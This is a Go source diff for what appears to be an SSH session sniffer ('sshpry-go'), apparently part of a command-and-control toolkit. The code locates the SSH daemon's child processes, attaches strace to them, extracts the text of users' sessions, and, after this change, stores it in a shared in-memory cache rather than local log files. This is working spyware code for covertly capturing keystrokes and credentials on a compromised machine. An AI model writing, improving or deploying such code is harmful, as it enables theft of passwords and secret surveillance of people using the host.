@@ -13,8 +13,14 @@ import (
 	"github.com/PatronC2/sshpry-go/strace"
 )
 
-var activeProcesses = make(map[int]bool)
-var mu sync.Mutex
+var (
+	activeProcesses = make(map[int]bool)
+	Caches          = make(map[int]*strings.Builder)
+	CacheMu         sync.Mutex
+	mu              sync.Mutex
+)
+
+var quotedString = regexp.MustCompile(`"([^"]*)"`)
 
 func GetSSHProcesses() ([]int, error) {
 	var sshPids []int
@@ -45,7 +51,6 @@ func GetSSHProcesses() ([]int, error) {
 			continue
 		}
 
-		// Find the SSH listener (likely parent is PID 1)
 		statBytes, err := os.ReadFile(fmt.Sprintf("/proc/%d/stat", pid))
 		if err != nil {
 			continue
@@ -56,11 +61,10 @@ func GetSSHProcesses() ([]int, error) {
 			ppid, err := strconv.Atoi(fields[3])
 			if err == nil && ppid == 1 && listenerPID == 0 {
 				listenerPID = pid
-				continue // skip the main listener
+				continue
 			}
 		}
 
-		// Skip if this is the same as the listener
 		if pid == listenerPID {
 			continue
 		}
@@ -72,7 +76,6 @@ func GetSSHProcesses() ([]int, error) {
 }
 
 func StartTracing(pid int) {
-	var quotedString = regexp.MustCompile(`"([^"]*)"`)
 	mu.Lock()
 	if activeProcesses[pid] {
 		mu.Unlock()
@@ -80,6 +83,10 @@ func StartTracing(pid int) {
 	}
 	activeProcesses[pid] = true
 	mu.Unlock()
+
+	CacheMu.Lock()
+	Caches[pid] = &strings.Builder{}
+	CacheMu.Unlock()
 
 	fmt.Printf("Starting trace on SSH process: %d\n", pid)
 
@@ -96,17 +103,8 @@ func StartTracing(pid int) {
 		log.Printf("Failed to start trace on PID %d: %v", pid, err)
 		return
 	}
-	stderrFile, err := os.Create(fmt.Sprintf("trace_err_%d.log", pid))
-	if err != nil {
-		log.Printf("Failed to create stderr log file for PID %d: %v", pid, err)
-		return
-	}
 
 	go func() {
-		defer stderrFile.Close()
-
-		var buffer strings.Builder
-
 		for {
 			stderrStr := s.Stderr.String()
 			if stderrStr != "" {
@@ -128,13 +126,12 @@ func StartTracing(pid int) {
 
 						unescaped = strings.ReplaceAll(unescaped, "\r", "\n")
 
-						buffer.WriteString(unescaped)
+						CacheMu.Lock()
+						if builder, ok := Caches[pid]; ok {
+							builder.WriteString(unescaped)
+						}
+						CacheMu.Unlock()
 					}
-				}
-
-				if buffer.Len() > 0 {
-					stderrFile.WriteString(buffer.String())
-					buffer.Reset()
 				}
 			}
 
